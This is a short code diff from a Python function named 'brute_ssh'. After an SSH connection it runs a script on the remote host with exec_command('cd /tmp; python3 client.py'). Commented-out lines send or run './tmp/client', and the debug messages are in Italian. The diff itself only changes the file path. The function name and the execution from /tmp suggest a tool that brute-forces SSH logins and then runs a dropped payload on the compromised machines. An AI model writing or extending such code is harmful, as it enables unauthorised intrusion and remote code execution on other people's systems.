@@ -113,7 +113,7 @@ def brute_ssh(hostname, username, password):
 #      shell = client.invoke_shell()
 #      shell.send('./tmp/client')
       print("PRIMA DI ESEGUIRE")
-      (stdin, stdout, stderr) = client.exec_command('cd /tmp; python3 ./client.py')
+      (stdin, stdout, stderr) = client.exec_command('cd /tmp; python3 client.py')
 #        (stdin, stdout, stderr) = client.exec_command('./tmp/client') 
       print("stdout:", stdout.read())
       print("DOPO ESEGUIRE")
